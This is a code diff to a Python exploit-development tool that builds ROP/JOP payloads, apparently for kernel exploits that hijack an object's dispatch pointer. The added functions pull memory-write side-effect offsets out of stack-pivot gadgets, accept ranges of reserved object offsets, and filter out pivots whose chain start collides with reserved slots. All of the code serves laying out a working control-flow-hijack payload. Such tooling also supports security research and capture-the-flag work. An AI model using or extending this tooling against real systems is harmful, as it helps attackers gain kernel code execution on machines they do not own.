@@ -412,6 +412,78 @@ def payload_to_c_struct(payload_dict, rop_chain, pivot, symbol_map,
     return "\n".join(lines)
 
 
+# ── Pivot side-effect extraction ─────────────────────────────────────
+
+import re
+
+_PIVOT_MEM_DEST_RE = re.compile(
+    r'(?:add|sub|or|xor|and|mov|adc|sbb|inc|dec|not|neg)\s+'
+    r'\w+\s+ptr\s+\[([^\]]+)\]')
+
+def _extract_side_effect_offsets(pivot, src_reg):
+    """Extract qword-aligned offsets written by side-effect memory ops in pivot gadgets.
+
+    Scans all gadgets in the pivot chain (JOP steps + pivot gadget, or the
+    direct gadget) for memory writes targeting [src_reg + offset].
+
+    Returns a set of qword-aligned offsets.
+    """
+    # Collect all register name variants that alias to src_reg
+    variants = {src_reg}
+    _VARIANTS = {
+        'rax': {'al', 'ah', 'ax', 'eax', 'rax'},
+        'rbx': {'bl', 'bh', 'bx', 'ebx', 'rbx'},
+        'rcx': {'cl', 'ch', 'cx', 'ecx', 'rcx'},
+        'rdx': {'dl', 'dh', 'dx', 'edx', 'rdx'},
+        'rdi': {'dil', 'di', 'edi', 'rdi'},
+        'rsi': {'sil', 'si', 'esi', 'rsi'},
+        'rbp': {'bp', 'ebp', 'rbp'},
+        'r8':  {'r8b', 'r8w', 'r8d', 'r8'},
+        'r9':  {'r9b', 'r9w', 'r9d', 'r9'},
+        'r10': {'r10b', 'r10w', 'r10d', 'r10'},
+        'r11': {'r11b', 'r11w', 'r11d', 'r11'},
+        'r12': {'r12b', 'r12w', 'r12d', 'r12'},
+        'r13': {'r13b', 'r13w', 'r13d', 'r13'},
+        'r14': {'r14b', 'r14w', 'r14d', 'r14'},
+        'r15': {'r15b', 'r15w', 'r15d', 'r15'},
+    }
+    if src_reg in _VARIANTS:
+        variants = _VARIANTS[src_reg]
+
+    # Collect all gadgets involved in the pivot
+    gadgets = []
+    if pivot.pivot_type in ('jop', 'jop_indirect', 'jop_push'):
+        for g, _ in pivot.jop_chain:
+            gadgets.append(g)
+        if pivot.pivot_gadget:
+            gadgets.append(pivot.pivot_gadget)
+    else:
+        gadgets.append(pivot.gadget)
+
+    offsets = set()
+    for gadget in gadgets:
+        for inst in gadget.insstr.split(';'):
+            m = _PIVOT_MEM_DEST_RE.search(inst.strip())
+            if not m:
+                continue
+            addr_expr = m.group(1).strip()
+            # Check if the base register is a variant of src_reg
+            # e.g. "rbx + 0x41" where rbx aliases src_reg
+            parts = re.split(r'\s*[+-]\s*', addr_expr)
+            if not parts or parts[0] not in variants:
+                continue
+            # Extract offset
+            off_match = re.search(r'[+-]\s*(?:0x)?([0-9a-fA-F]+)', addr_expr)
+            if off_match:
+                sign = -1 if '-' in addr_expr[:addr_expr.index(off_match.group(1))] else 1
+                off = sign * int(off_match.group(1), 16)
+            else:
+                off = 0
+            if off >= 0:
+                offsets.add(off & ~7)  # qword-align
+    return offsets
+
+
 # ── Patched payload builder ──────────────────────────────────────────
 
 def build_patched_payload(e, rop_chain, pivot, occupied, obj_size=0x100):
@@ -755,15 +827,22 @@ def main():
     # Reserved object offsets (e.g. vtable pointer the kernel loads before dispatch)
     used_dispatch = {}
     raw_offsets = prompt_string(
-        "Reserved object offsets (hex, comma-separated, e.g. 0x10,0x18)", "none")
+        "Reserved object offsets (hex, comma-separated, e.g. 0x10,0x18 or 0x0-0x10)", "none")
     if raw_offsets.lower() != "none" and raw_offsets:
         for tok in raw_offsets.split(','):
             tok = tok.strip()
             if not tok:
                 continue
             try:
-                off = int(tok, 16) if tok.startswith('0x') else int(tok)
-                used_dispatch[off] = 0
+                if '-' in tok:
+                    parts = tok.split('-', 1)
+                    lo = int(parts[0], 16) if parts[0].startswith('0x') else int(parts[0])
+                    hi = int(parts[1], 16) if parts[1].startswith('0x') else int(parts[1])
+                    for off in range(lo, hi + 1, 8):
+                        used_dispatch[off] = 0
+                else:
+                    off = int(tok, 16) if tok.startswith('0x') else int(tok)
+                    used_dispatch[off] = 0
             except ValueError:
                 print("  Skipping invalid offset: {}".format(tok))
     if used_dispatch:
@@ -781,6 +860,34 @@ def main():
     if not pivots:
         print("No pivots found from {}.".format(pivot_reg))
         sys.exit(1)
+
+    # Filter out inline pivots whose chain start lands on a reserved offset.
+    # Indirect pivots are exempt (chain lives at a separate address).
+    if used_dispatch:
+        reserved_set = set(used_dispatch)
+        before = len(pivots)
+        filtered = []
+        for p in pivots:
+            if p.pivot_type in ('indirect', 'jop_indirect'):
+                filtered.append(p)
+                continue
+            chain_off = (p.chain_offset_computed
+                         if p.pivot_type in ('jop', 'jop_push')
+                         else p.offset)
+            # Merge dispatch entries with user-reserved offsets
+            all_reserved = set(reserved_set)
+            for off, _ in p.dispatch_entries:
+                all_reserved.add(off)
+            # Check if every slot in the chain region is occupied —
+            # shift gadgets can skip some conflicts, but if the chain
+            # start itself is reserved we can't place anything there.
+            if chain_off in all_reserved:
+                continue
+            filtered.append(p)
+        pivots = filtered
+        dropped = before - len(pivots)
+        if dropped:
+            print("Filtered {} pivot(s) conflicting with reserved offsets.".format(dropped))
 
     # Ask whether to include indirect pivots
     has_indirect = any(p.pivot_type in ('indirect', 'jop_indirect')
@@ -814,6 +921,15 @@ def main():
     if pivot.pivot_type in ('jop', 'jop_indirect', 'jop_push'):
         for off, addr in pivot.dispatch_entries:
             all_occupied[off] = addr
+
+    # Add side-effect write offsets from pivot gadgets
+    side_effect_offs = _extract_side_effect_offsets(pivot, pivot_reg)
+    if side_effect_offs:
+        print("Pivot side-effect writes: {}".format(
+            ", ".join("0x{:x}".format(o) for o in sorted(side_effect_offs))))
+        for off in side_effect_offs:
+            if off not in all_occupied:
+                all_occupied[off] = 0
 
     if is_indirect:
         # Indirect: chain goes at a separate known address, not inline.
